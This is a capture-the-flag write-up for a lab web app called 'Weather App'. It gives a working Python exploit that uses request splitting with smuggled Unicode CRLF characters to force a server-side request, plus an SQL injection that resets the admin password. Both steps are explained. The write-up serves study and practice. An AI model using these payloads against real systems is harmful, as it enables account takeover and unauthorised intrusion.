# Weather App

This was a hard box for me. I found the SQL injection point, but was unable to build the correct SQL query to inject in order to be able to update the admin password. While reading a write up on this box I also saw the SSRF trick that was needed in order to trick the server in to registering a user on your behalf. Don't think I would have been able to figure that one out on my own. 

### Python script to pwn the box

```python3
import requests

url = "http://localhost:1337"
username = "admin"

# This is the SQL injection query that we want to run. The password for admin will be set to 123.
password = "123') ON CONFLICT(username) DO UPDATE SET password = '123'; --"

url_encoded_password = password.replace(" ", "\uFF20").replace("'","%27").replace('""', "%22")
length = len(url_encoded_password) + len(username) + 19

endpoint = "127.0.0.1/\uFF20HTTP/1.1\uFF0D\uFF0A"
endpoint += "Host:\uFF20127.0.0.1\uFF0D\uFF0A\uFF0D\uFF0A"
endpoint += "POST\uFF20/register\uFF20HTTP/1.1\uFF0D\uFF0A"
endpoint += "Host:\uFF20127.0.0.1\uFF0D\uFF0A"
endpoint += "Content-Type:\uFF20application/x-www-form-urlencoded\uFF0D\uFF0A"
endpoint += "Content-Length:\uFF20"+str(length)+"\uFF0D\uFF0A\uFF0D\uFF0A"
endpoint += "username="+username+"&password="+url_encoded_password+"\uFF0D\uFF0A\uFF0D\uFF0A"
endpoint += "GET\uFF20"

data = {"endpoint": endpoint, "city": "bla", "country": "bla"}

response = requests.post(url+"/api/weather", data=data)
```

### How the SQL exploit works

- The /register endpoint is vulnerable to a SQL injection but it only allows requests from `127.0.0.1`. So we have to trick the server in to sending the POST request with the SQL injection.
- The flag will only be visible if we log in with the `admin` username, so we have to change the password for the `admin` user.
- Sending a POST request with `username="admin"&password="123') ON CONFLICT(username) DO UPDATE SET password = '123'; --"` will do the trick. The complete query that the server recieves will look something like this `INSERT INTO users (username, password) VALUES (‘admin’, ‘123’) ON CONFLICT(username) DO UPDATE SET password = ‘123’; --`
- - the `username` is set to be UNIQUE, so the query will fail due to the UNIQUE clause. 
- - We then tell the SQLLite server to update the password if there is a conflict in the `username` column. 
- - `--` is a line comment, it tells SQL to ignore the rest of the query.

### How the SSRF exploit works

Essentially what we wan't to do is to tell the server to connect to itself and POST the SQLI query that we wrote. There is a route called `/api/weather` that we can abuse. Since we are able to define the `endpoint` parameter used by the server when sending its request to fetch the weather we can trick the server to sending a request to itself. 

The `/api/weather` request URL looks like this. 

`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`

A carefully crafted `endpoint` variable will trick the server to sending a POST request to itself. (See the `endpoint` variable in the python script above.) The string we're sending is bypassing the NodeJS parsing and injecting another HTTP request to the initial request.


So instead of sending this request as intended

```HTTP/1.1
GET /data/2.5/weather?q=Stockholm,SE&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1
Host: api.openweathermap.org
Connection: close
```

We're injecting our code to send this request. (Or something similar, not sure if the GET request to api.openweathermap.org is actually sent or cut off.) 

```HTTP/1.1
HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1

Content-Type: application/x-www-form-urlencoded
username=admin&password=theSQLquery

GET /data/2.5/weather?q=Stockholm,SE&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1
Host: api.openweathermap.org
Connection: close
```
